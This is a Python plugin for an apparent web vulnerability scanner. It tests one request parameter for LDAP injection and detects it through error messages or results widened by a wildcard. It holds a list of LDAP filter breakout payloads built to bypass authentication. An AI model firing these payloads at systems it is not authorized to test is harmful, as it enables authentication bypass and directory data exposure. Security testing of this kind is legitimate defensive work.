"""ldap_injection — LDAP filter injection (auth-bypass & error based)."""
import re
from common import Finding

NAME = "ldap_injection"

ERROR_MARKERS = re.compile(
    r"(javax\.naming|com\.sun\.jndi|LDAPException|Bad search filter|"
    r"Invalid DN syntax|Protocol error|ldap_search|Invalid credentials)", re.IGNORECASE)

# Wildcard/breakout payloads; `*` should widen results if injected into a filter.
PAYLOADS = ["*", "*)(uid=*))(|(uid=*", "*)(|(objectclass=*", "admin)(&))",
            ")(cn=*", "*))%00", "*()|&'"]


def _sim(a, b):
    if not a and not b:
        return 1.0
    m = max(len(a), len(b))
    return (min(len(a), len(b)) / m) if m else 1.0


def _send(client, method, param, val):
    if method == "GET":
        return client.request("GET", params={param: val})
    return client.request("POST", data={param: val})


def run(client, opts):
    param = opts.get("param")
    if not param:
        return [Finding(NAME, "info", "LDAP-injection check skipped", "no --param provided")]
    method = opts.get("method", "GET").upper()
    base = str(opts.get("base_value", "test"))
    out = []
    baseline = _send(client, method, param, base)

    for p in PAYLOADS:
        r = _send(client, method, param, p)
        m = ERROR_MARKERS.search(r.body)
        if m and not ERROR_MARKERS.search(baseline.body):
            out.append(Finding(NAME, "high", "LDAP injection (error-based)",
                               f"payload {p!r} triggered an LDAP error", m.group(0)))
            return out
        # `*` widening: response grows substantially / diverges but stays 2xx
        if p == "*" and r.status < 400 and _sim(r.body, baseline.body) < 0.85 \
                and len(r.body) > len(baseline.body) * 1.2:
            out.append(Finding(NAME, "high", "Possible LDAP injection (wildcard widened results)",
                               f"'*' returned a larger/different result set",
                               f"len {len(baseline.body)}->{len(r.body)}"))
            return out
    return out
